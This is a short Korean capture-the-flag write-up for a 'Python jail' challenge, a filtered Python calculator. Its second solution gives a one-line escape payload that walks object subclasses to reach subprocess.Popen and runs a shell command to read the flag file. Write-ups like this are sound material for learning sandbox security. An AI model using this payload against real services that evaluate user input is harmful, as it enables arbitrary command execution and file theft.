# 키워드
- Python jail

---
# 풀이 과정
- 파이썬을 이용해 계산기를 구현하였음.
- 여러가지 필터링이 있었지만 아래와 같은 코드로 flag를 얻을 수 있음 
![[스크린샷 2023-12-21 115442.png]]



---
# 다른 풀이(n0paew님)

- 다음과 같이 python class를 가져오는 코드를 입력하면 파이썬 클래스 목록을 볼 수 있다.
![[Pasted image 20240120150353.png]]

- 파이썬 class 목록에 237번째에 subprocess.Popen 클래스가 존재해서 해당 클래스를 이용해 PoC 코드를 작성했다.
![[Untitled.png]]

```python
''.__class__.__mro__[1].__subclasses__()[237]('cat flag',shell=True,stdout=-1).communicate()
```